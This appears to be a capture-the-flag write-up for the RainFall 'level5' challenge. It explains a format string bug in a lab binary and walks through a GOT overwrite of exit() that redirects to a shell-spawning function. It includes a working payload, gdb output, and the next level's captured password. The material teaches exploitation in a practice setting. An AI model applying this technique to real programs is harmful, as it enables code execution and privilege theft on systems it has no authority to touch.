## Step 1: Static & Dynamic Analysis

```c
080484a4    void o() __noreturn
080484a4    {
080484a4        system("/bin/sh");
080484bd        _exit(1);
080484a4    }

080484c2    void n() __noreturn
080484c2    {
080484c2        void var_20c;
080484e5        fgets(&var_20c, 0x200, __bss_start);
080484f3        printf(&var_20c);
080484ff        exit(1);
080484c2    }

08048504    int32_t main(int32_t argc, char** argv, char** envp)
08048504    {
08048504        n();
08048504    }
```

### Explanation
`v()` reads user input into a buffer (`var_20c`) using `fgets()` and then passes it directly to `printf()`.
This introduces a `format string vulnerability` because `printf()` interprets format specifiers if the input contains them.

The difficulty here is that we cannot overwrite the return address to jump to `o()` because `n()` doesn't return, it calls `exit()` immediately after `printf()`.  
The solution is to overwrite the `GOT` `(Global Offset Table)` entry of `exit()` with the address of `o()`.

```asm
(gdb) disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:     push   %ebp
   0x080484c3 <+1>:     mov    %esp,%ebp
   0x080484c5 <+3>:     sub    $0x218,%esp
   0x080484cb <+9>:     mov    0x8049848,%eax
   0x080484d0 <+14>:    mov    %eax,0x8(%esp)
   0x080484d4 <+18>:    movl   $0x200,0x4(%esp)
   0x080484dc <+26>:    lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:    mov    %eax,(%esp)
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:    mov    %eax,(%esp)
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    movl   $0x1,(%esp)
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
```

When the program call `exit()`, it first jumps to `exit@plt`, which is the `PLT` `(Procedure Linkage Table)` entry for `exit()`.

```asm
(gdb) disas
Dump of assembler code for function exit@plt:
=> 0x080483d0 <+0>:     jmp    *0x8049838
   0x080483d6 <+6>:     push   $0x28
   0x080483db <+11>:    jmp    0x8048370
End of assembler dump.
```

The first instruction jumps to the address stored in `0x8049838` (the GOT entry for `exit()`).

```asm
(gdb) x/1wx 0x8049838
0x8049838 <exit@got.plt>:       0x080483d6
```

We will replace this address with the address of `o()`.

```bash
level5@RainFall:~$ ./level5 
AAAA %x.%x.%x.%x.%x.%x.%x. 
AAAA 200.b7fd1ac0.b7ff37d0.41414141.2e782520.252e7825.78252e78.
```

Here we can see our string input is stored in fourth position from `printf()` perspective.

## Step 2: Exploiting the Binary

```bash
level5@RainFall:~$ python -c 'print "\x08\x04\x98\x38"[::-1] + "%134513824d%4$n"' > /tmp/exploit
level5@RainFall:~$ cat /tmp/exploit - | ./level5

% cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

The first part of the payload, `"\x08\x04\x98\x38"[::-1]`, represents the address of the `GOT` entry for `exit()` (`0x8049838`) in little-endian format. This address is injected so that `printf()` uses it as the target memory location for the write operation.

Next, the string `"%134513824d"` is used to generate a large number of printed characters. This ensures that printf()'s internal character count reaches exactly the value corresponding to the address of o() (`0x080484a4`).

Finally, the `"%4$n"` specifier tells `printf()` to write the total number of characters printed so far to the memory location specified by the fourth argument on the stack, which is the `GOT` entry for `exit()`. This effectively replaces the address of `exit()` with the address of `o()`.
